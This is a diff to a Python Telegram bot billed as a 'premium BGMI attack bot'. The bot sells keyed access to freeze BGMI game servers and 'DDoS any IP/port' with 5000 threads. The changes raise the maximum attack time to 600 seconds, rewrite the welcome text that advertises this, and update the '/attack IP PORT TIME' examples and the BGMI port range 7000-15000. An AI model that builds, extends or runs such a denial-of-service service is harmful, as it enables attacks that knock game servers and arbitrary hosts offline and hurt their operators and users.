@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-""" 
+"""
 💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
 Server Freeze Bot | Random Emoji + Sticker | Auto Update | Welcome Animation
 """
@@ -42,7 +42,7 @@ LINE = "━━━━━━━━━━━━━━━━━━━"
 
 # ═══════════════ SETTINGS ═══════════════
 PREMIUM_THREADS = 5000
-PREMIUM_TIME = 400
+PREMIUM_TIME = 600  # 10 minutes = 600 seconds
 
 # ═══════════════ TRACKING ═══════════════
 used_videos = []
@@ -135,7 +135,6 @@ def get_random_emoji():
     global last_emoji_index
     data = get_emojis()
     if data["emojis"]:
-        # Ensure we don't get the same emoji twice in a row
         if len(data["emojis"]) > 1:
             available = [i for i in range(len(data["emojis"])) if i != last_emoji_index]
             if available:
@@ -177,7 +176,6 @@ def get_random_sticker():
     global last_sticker_index
     data = get_stickers()
     if data["stickers"]:
-        # Ensure we don't get the same sticker twice in a row
         if len(data["stickers"]) > 1:
             available = [i for i in range(len(data["stickers"])) if i != last_sticker_index]
             if available:
@@ -514,7 +512,6 @@ async def welcome_animation(client, msg):
             current_text += char
             await asyncio.sleep(0.08)
             try:
-                # Change emoji every few characters
                 if i % 2 == 0:
                     emoji = starting_emojis[emoji_idx % len(starting_emojis)]
                     await starting_msg.edit_text(f"{emoji} {current_text}")
@@ -541,28 +538,26 @@ async def welcome_animation(client, msg):
         
         await asyncio.sleep(0.5)
         
-        # Step 7: Final welcome message
+        # Step 7: Final welcome message with EXACT text
         final_text = f"""
-HEY, ⚡ I'm → HeaVen  
-I'M 'BGMI ✘ ATTACK, ♪,  
+ʜᴇʏ, ⌬ [{first_name}](tg://user?id={user_id}) 
+ɪ'ᴍ ˹[{BOT_USERNAME}]({BOT_LINK}) ✘ 𝚫𝛕𝛕𝛂𝛓𝛋𝛆𝛄˼ ♪,
 
-- ❖ I HAVE SPECIAL FEATURES.  
-- ❖ ALL-IN-ONE BOT.  
+┏━━━━━━━━━━━━━━━━━⧫
+┠ ◆ ɪ ʜᴀᴠᴇ sᴘᴇᴄɪᴀʟ ғᴇᴀᴛᴜʀᴇs.
+┠ ◆ ᴀʟʟ-ɪɴ-ᴏɴᴇ ʙᴏᴛ.
+┗━━━━━━━━━━━━━━━━━⧫
+┏━━━━━━━━━━━━━━━━━⧫
+┠ ◆ ʏᴏᴜ ᴄᴀɴ ғʀᴇᴇᴢᴇ ʙɢᴍɪ ꜱᴇʀᴠᴇʀ.
+┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴅᴅᴏꜱ ᴀɴʏ ɪᴘ/ᴘᴏʀᴛ.
+┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ 5000+ ᴛʜʀᴇᴀᴅꜱ ꜰᴏʀ ᴍᴀx ᴅᴀᴍᴀɢᴇ.
+┠ ◆ ɪ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴜᴘᴛᴏ 10 ᴍɪɴᴜᴛᴇꜱ.
+┠ ◆ ꜱᴘᴇᴄɪᴀʟ ᴡᴇʟᴄᴏᴍᴇ 
+┠ ◆ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ᴄʟɪᴄᴋ ᴄᴏᴍᴍᴀɴᴅs ʙᴜᴛᴛᴏɴ...
+┗━━━━━━━━━━━━━━━━━⧫
+๏ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴᴅ ᴄᴏᴍᴍᴀɴᴅs.
 
-- ❖ YOU CAN FREEZE BGMI SERVERS.  
-- ❖ YOU CAN DDOS ANY IP/PORT.  
-- ❖ YOU CAN USE 5000+ THREADS FOR MAX DAMAGE.  
-
-- ❖ I CAN ATTACK UPTO 4 MINUTES.  
-- ❖ SPECIAL WELCOME  
-- ❖ MORE FEATURES CLICK COMMANDS BUTTON...  
-
-- ❍ CLICK ON THE HELP BUTTON TO GET INFORMATION ABOUT MY MODULES AND COMMANDS.  
-
----
-
-**DEVELOPER**  
-**[FATHER OF BOT]({OWNER_LINK})**
+🫧 ᴅᴇᴠᴇʟᴏᴩᴇʀ 🫧 ➪ [𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞]({OWNER_LINK}) ✔︎
 """
         
         if user_id == OWNER_ID:
@@ -890,7 +885,7 @@ async def attack_cmd(client, msg):
     
     parts = msg.text.split()
     if len(parts) < 4:
-        return await msg.reply_text("⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 120")
+        return await msg.reply_text("⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
     
     ip = parts[1]
     try: port = int(parts[2])
@@ -1048,6 +1043,7 @@ async def commands_cmd(client, msg):
         "🧹 /clearvideos - Clear All Videos\n\n"
         "🔑 /genkey NAME TIME - Generate Key\n\n"
         f"🎮 **BGMI PORTS:** 7000-15000\n"
+        f"⏱️ **MAX ATTACK:** 600 seconds (10 minutes)\n"
         f"👑 [FATHER OF BOT]({OWNER_LINK})"
     )
 
@@ -1096,6 +1092,7 @@ async def callbacks(client, cb: CallbackQuery):
             "🗑️ /removesticker index - Remove Sticker\n"
             "🔄 /resetstickers - Reset All Stickers\n\n"
             f"🎮 **BGMI PORTS:** 7000-15000\n"
+            f"⏱️ **MAX ATTACK:** 600 seconds (10 minutes)\n"
             f"👑 [FATHER OF BOT]({OWNER_LINK})",
             reply_markup=back_kb()
         )
@@ -1154,7 +1151,7 @@ async def callbacks(client, cb: CallbackQuery):
             f"📹 {len(get_vids())} Videos\n"
             f"{LINE}\n"
             "⚔️ /attack IP PORT TIME\n"
-            "📋 /attack 1.2.3.4 8080 120\n"
+            "📋 /attack 1.2.3.4 8080 600\n"
             "🎮 BGMI Ports: 7000-15000\n"
             f"{LINE}\n"
             "🔽 SELECT OPTION:"
@@ -1353,11 +1350,11 @@ async def callbacks(client, cb: CallbackQuery):
         await cb.message.edit_text(
             f"💀 **ATTACK MENU**\n\n{LINE}\n"
             f"⚔️ /attack IP PORT TIME\n"
-            f"📋 /attack 1.2.3.4 8080 120\n"
+            f"📋 /attack 1.2.3.4 8080 600\n"
             f"{LINE}\n"
             f"🎮 BGMI: 7000-15000\n"
             f"⚡ {info['threads']} Threads\n"
-            f"⏱️ {info['max_time']}s Max",
+            f"⏱️ {info['max_time']}s Max (10 Minutes)",
             reply_markup=back_kb()
         )
         return
@@ -1498,6 +1495,7 @@ print("""
 ║  RANDOM EMOJI + STICKER             ║
 ║  AUTO UPDATE + DELETE               ║
 ║  USER PROFILE LINK                  ║
+║  MAX ATTACK: 600 SECONDS (10 MIN)   ║
 ╚══════════════════════════════════════╝
 ✅ Bot Ready!
 """)
